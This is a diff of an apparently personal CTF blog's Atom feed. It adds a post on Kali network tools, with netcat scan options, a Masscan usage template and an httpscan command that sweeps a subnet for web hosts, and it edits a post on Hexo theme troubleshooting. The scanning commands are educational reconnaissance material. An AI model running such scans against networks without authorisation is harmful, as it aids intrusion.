data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-v&lt;/span&gt;                      verbose &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;使用两次以更加详细&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-w&lt;/span&gt; secs                 连接和最终网络读取的超时时间&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-C&lt;/span&gt;                      发送 CRLF 作为行结束符&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token parameter variable&#34;&gt;-z&lt;/span&gt;                      零 I/O 模式 &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;用于扫描&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;port numbers can be individual or ranges: lo-hi &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;inclusive&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;hyphens &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; port names must be backslash escaped &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;e.g. &lt;span class=&#34;token string&#34;&gt;&#39;ftp\-data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;.&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 端口号可以是单个端口号，也可以是范围：lo-hi [包含]；&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# 端口名称中的连字符必须使用反斜杠转义（例如 “ftp\-data”）。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;后话&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后话&#34;&gt;#&lt;/a&gt; 后话&lt;/h2&gt;
+&lt;p&gt;nc、netcat、nmap……kali 还有多少不可估量的工具等着自己发掘&lt;/p&gt;
+&lt;h3 id=&#34;题外话1masscan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题外话1masscan&#34;&gt;#&lt;/a&gt; 题外话 1：&lt;a href=&#34;http://t.csdnimg.cn/2uU8h&#34;&gt;Masscan&lt;/a&gt;&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Masscan 是一款快速、高性能的开源端口扫描工具，旨在以极高的速度扫描整个互联网的 IPv4 地址空间。它的设计目标是快速、灵活且适用于大规模的端口扫描任务。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;masscan &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;IP或网段&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;-p&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;端口号或端口范围&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token parameter variable&#34;&gt;--rate&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;每秒发送数据包数量&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;（一般十万或一百万）&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;其他参数详解：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;选项&lt;/th&gt;
+&lt;th&gt;作用&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;--excludefile filename&lt;/td&gt;
+&lt;td&gt;排除文件中的选项&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oX filename&lt;/td&gt;
+&lt;td&gt;输出到 filename 的 XML&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oG filename&lt;/td&gt;
+&lt;td&gt;输出到 filename 在的 grepable 格式&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;-oJ filename&lt;/td&gt;
+&lt;td&gt;输出到 filename 在 JSON 格式。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;主打一个快捷迅速&lt;br /&gt;
+&lt;strong&gt;参考文章：&lt;/strong&gt;&lt;br /&gt;
+&lt;a href=&#34;http://t.csdnimg.cn/2uU8h&#34;&gt;http://t.csdnimg.cn/2uU8h&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;题外话2httpscan&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题外话2httpscan&#34;&gt;#&lt;/a&gt; 题外话 2：&lt;a href=&#34;https://github.com/zer0h/httpscan&#34;&gt;httpscan&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/zer0h/httpscan&#34;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;httpscan.py &lt;span class=&#34;token number&#34;&gt;192.168&lt;/span&gt;.0.0/24 –t &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;blockquote&gt;
+&lt;p&gt;httpscan 是一个扫描指定 CIDR 网段的 Web 主机的小工具。和端口扫描器不一样，httpscan 是以爬虫的方式进行 Web 主机发现，因此相对来说不容易被防火墙拦截。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接：&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;http://t.csdnimg.cn/iN9Wc&#34;&gt;http://t.csdnimg.cn/iN9Wc&lt;/a&gt;&lt;/p&gt;
+</content>
+        <category term="AWD" scheme="https://ctf-learner.github.io/categories/AWD/" />
+        <category term="kali" scheme="https://ctf-learner.github.io/tags/kali/" />
+        <category term="tools" scheme="https://ctf-learner.github.io/tags/tools/" />
+        <category term="AWD" scheme="https://ctf-learner.github.io/tags/AWD/" />
+        <category term="CTF" scheme="https://ctf-learner.github.io/tags/CTF/" />
+        <updated>2024-04-15T09:44:44.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/</id>
         <title>AWD初体验</title>
-        <link rel="alternate" href="https://ctf-learner.github.io/20240414AWD%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
+        <link rel="alternate" href="https://ctf-learner.github.io/post/AWD%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
         <content type="html">&lt;p&gt;被打爆了，learning~~&lt;br /&gt;
  等待作者更新吧&lt;/p&gt;
 </content>
@@ -27,9 +365,9 @@
         <updated>2024-04-14T04:40:23.000Z</updated>
     </entry>
     <entry>
-        <id>https://ctf-learner.github.io/20240410%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/</id>
+        <id>https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/</id>
         <title>搭博客一路的心酸</title>
-        <link rel="alternate" href="https://ctf-learner.github.io/20240410%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/"/>
+        <link rel="alternate" href="https://ctf-learner.github.io/post/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/"/>
         <content type="html">&lt;p&gt;一开始一眼相中了 shoka 主题的样式，谁料到后来搬石头砸了自己的脚。&lt;br /&gt;
 部署到一半发现 shoka 有了升级版 shokaX，只得重新来过&lt;br /&gt;
 随后 &lt;code&gt;npm install&lt;/code&gt;  反复报错，真是头大&lt;br /&gt;
@@ -61,14 +399,14 @@
 &lt;blockquote&gt;
 &lt;p&gt;先看看官网的解释&lt;br /&gt;
 相对地址&lt;br /&gt;
-默认情况下，Hexo 生成的超链接都是绝对地址。例如，如果您的网站域名为 &lt;a href=&#34;http://example.com&#34;&gt;example.com&lt;/a&gt;，您有一篇文章名为 hello，那么绝对链接可能像这样：&lt;a href=&#34;http://example.com/hello.html%EF%BC%8C%E5%AE%83%E6%98%AF%E7%BB%9D%E5%AF%B9%E4%BA%8E%E5%9F%9F%E5%90%8D%E7%9A%84%E3%80%82%E7%9B%B8%E5%AF%B9%E9%93%BE%E6%8E%A5%E5%83%8F%E8%BF%99%E6%A0%B7%EF%BC%9A/hello.html%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%EF%BC%8C%E6%97%A0%E8%AE%BA%E7%94%A8%E4%BB%80%E4%B9%88%E5%9F%9F%E5%90%8D%E8%AE%BF%E9%97%AE%E8%AF%A5%E7%AB%99%E7%82%B9%EF%BC%8C%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%B3%E7%B3%BB%EF%BC%8C%E8%BF%99%E5%9C%A8%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%97%B6%E5%8F%AF%E8%83%BD%E7%94%A8%E5%88%B0%E3%80%82%E9%80%9A%E5%B8%B8%E6%83%85%E5%86%B5%E4%B8%8B%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E7%BB%9D%E5%AF%B9%E5%9C%B0%E5%9D%80%E3%80%82&#34;&gt;http://example.com/hello.html，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。&lt;/a&gt;&lt;br /&gt;
-这里相对路径其实指的网站的根目录&lt;br /&gt;
+默认情况下，Hexo 生成的超链接都是绝对地址。例如，如果您的网站域名为 &lt;a href=&#34;http://example.com&#34;&gt;example.com&lt;/a&gt;，您有一篇文章名为 hello，那么绝对链接可能像这样：&amp;lt;&lt;a href=&#34;http://example.com/hello.html%5C&#34;&gt;http://example.com/hello.html\&lt;/a&gt;&amp;gt; ，它是绝对于域名的。相对链接像这样：/hello.html，也就是说，无论用什么域名访问该站点，都没有关系，这在进行反向代理时可能用到。通常情况下，建议使用绝对地址。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;这里相对路径其实指的网站的根目录&lt;br /&gt;
 在 hexo g 之后生成的 public 目录会在 hexo d 部署到网站上&lt;br /&gt;
 那么相对路径指的就是以 public 目录为起始 /&lt;br /&gt;
 &lt;img loading=&#34;lazy&#34; data-src=&#34;/images/%E6%90%AD%E5%8D%9A%E5%AE%A2%E4%B8%80%E8%B7%AF%E7%9A%84%E5%BF%83%E9%85%B8/24-04-10-4.png&#34; alt=&#34;public文件夹&#34; /&gt;&lt;br /&gt;
-如果还是定位不到图片的地址，就把图片和文章放一起 hexo g 之后看结果&lt;br /&gt;
+如果还是定位不到图片的地址，就把图片和文章放一起 hexo g 之后看 /public 下的位置&lt;br /&gt;
 然后就知道图片的地址该怎么写了&lt;/p&gt;
-&lt;/blockquote&gt;
 &lt;h3 id=&#34;imagesyml图片加载不到问题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#imagesyml图片加载不到问题&#34;&gt;#&lt;/a&gt; images.yml 图片加载不到问题&lt;/h3&gt;
 &lt;blockquote&gt;
 &lt;p&gt;官方配置文档：&lt;a href=&#34;https://docs.kaitaku.xyz/guide/theme.html#%E8%87%AA%E5%AE%9A%E4%B9%89%E7%BD%91%E7%AB%99%E8%BD%AE%E6%92%AD%E5%9B%BE&#34;&gt;https://docs.kaitaku.xyz/guide/theme.html# 自定义网站轮播图&lt;/a&gt;&lt;/p&gt;
@@ -81,13 +419,15 @@
 &lt;li class=&#34;lvl-2&#34;&gt;
 &lt;p&gt;source/_data/images_index.yml&lt;/p&gt;
 &lt;/li&gt;
-&lt;li class=&#34;lvl-2&#34;&gt;
-&lt;p&gt;source/_data/images.yml&lt;/p&gt;
-&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;这些位置都&lt;strong&gt;没有成功&lt;/strong&gt;加载网站背景图片。&lt;br /&gt;
 &lt;strong&gt;&lt;mark&gt;解决方案&lt;/mark&gt;&lt;/strong&gt;&lt;br /&gt;
 直接修改 &lt;code&gt;主题文件夹下_images_index.yml&lt;/code&gt; ，即 &lt;code&gt;/theme/shohaX/images.yml&lt;/code&gt; 。按照官方文档 SXC 的下载方式，主题文件夹在 &lt;code&gt;/node_modules/hexo-theme-shokaX/images.yml&lt;/code&gt;&lt;/p&gt;
+&lt;ul class=&#34;lvl-0&#34;&gt;
+&lt;li class=&#34;lvl-2&#34;&gt;
+&lt;p&gt;source/_data/images.yml&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
 &lt;blockquote&gt;
 &lt;p&gt;心里话：真是给我累吐血了&lt;/p&gt;
 &lt;/blockquote&gt;
